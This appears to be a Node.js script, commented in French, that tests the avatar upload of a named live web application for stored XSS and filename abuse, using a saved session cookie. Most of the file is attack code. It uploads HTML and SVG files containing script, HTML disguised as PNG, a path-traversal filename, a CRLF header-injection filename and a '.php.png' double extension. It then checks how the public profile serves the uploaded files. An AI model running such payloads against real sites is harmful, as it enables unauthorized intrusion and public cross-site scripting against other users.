// CYBERAAR : upload d avatar (actif Critique) — le filtre de type est-il cote serveur ?
// L avatar est affiche publiquement (leaderboard, profil) -> un HTML/SVG accepte = XSS stockee publique.
import fs from "fs";
const APP = "https://aarme.cyberaar.io";
const UA = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36";
const COOKIE = fs.readFileSync("/tmp/opencode/cyberaar/session-cookie.txt", "utf8").trim();
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
async function up(label, filename, type, content) {
  const fd = new FormData();
  fd.append("file", new Blob([content], { type }), filename);
  const t0 = Date.now();
  // ATTENTION : ne pas forcer Content-Type (sinon le corps multipart n est pas interprete)
  const r = await fetch(APP + "/api/aarme/account/avatar", { method: "POST", headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Referer: APP + "/compte/", Cookie: COOKIE }, body: fd, redirect: "manual", signal: AbortSignal.timeout(25000) });
  const t = await r.text();
  console.log("  " + label.padEnd(48) + "HTTP " + r.status + " " + String(Date.now() - t0).padStart(5) + "ms  " + t.replace(/\s+/g, " ").slice(0, 200));
  return { s: r.status, txt: t };
}
const PNG = Buffer.from("89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c4890000000a49444154789c6360000000200015a2d4a0000000049454e44ae426082", "hex");
console.log("=== upload d avatar : le serveur filtre-t-il le type et le nom ? ===\n");
const r1 = await up("PNG valide (controle)", "photo.png", "image/png", PNG);
await sleep(2000);
await up("HTML type text/html", "x.html", "text/html", Buffer.from("<html><body><script>alert(document.domain)</script>PING-AVATAR</body></html>"));
await sleep(2000);
await up("HTML deguise en image/png", "x.png", "image/png", Buffer.from("<html><body><script>alert(1)</script>PING-PNG</body></html>"));
await sleep(2000);
await up("SVG (XSS)", "x.svg", "image/svg+xml", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script><text>PING-SVG</text></svg>'));
await sleep(2000);
await up("nom en traversee de chemin", "../../../../tmp/evil.png", "image/png", PNG);
await sleep(2000);
await up("nom avec CRLF", "a\r\nX-Injected: 1.png", "image/png", PNG);
await sleep(2000);
await up("nom avec espaces/unicode + .php", "a b.php.png", "image/png", PNG);

console.log("\n=== ou l avatar est-il servi ? (type de reponse + inline ?) ===");
if (r1.s === 200) {
  let url = "";
  try { url = JSON.parse(r1.txt).url || JSON.parse(r1.txt).avatar_url || ""; } catch {}
  console.log("  URL renvoyee : " + (url || "(aucune dans la reponse) " + r1.txt.slice(0, 200)));
  const me = await fetch(APP + "/api/aarme/account/me", { headers: { Accept: "application/json", "User-Agent": UA, Origin: APP, Cookie: COOKIE } });
  const mt = await me.text();
  console.log("  /me (avatar) : " + (mt.match(/"avatar"[^,}]{0,120}/) || ["(non trouve)"])[0]);
  // le profil public
  const pub = await fetch("https://aarme.cyberaar.io/h/" + (mt.match(/"handle":"([^"]+)"/) || [, ""])[1], { headers: { "User-Agent": UA } });
  const pt = await pub.text();
  const av = [...new Set([...pt.matchAll(/https?:\/\/[^"'\s<>]+\.(?:png|jpg|jpeg|webp|svg|gif)[^"'\s<>]*/gi)].map((m) => m[0]))];
  console.log("  images dans le profil public : " + (av.join(", ") || "(aucune)"));
  for (const a of av.slice(0, 3)) {
    const h = await fetch(a, { headers: { "User-Agent": UA }, redirect: "manual" });
    const hh = h.headers.get("content-type") || "";
    const cc = h.headers.get("content-disposition") || "";
    console.log("    " + a.replace(/^https?:\/\//, "").slice(0, 70) + "  -> HTTP " + h.status + " ct=" + hh + (cc ? " cd=" + cc : ""));
  }
}
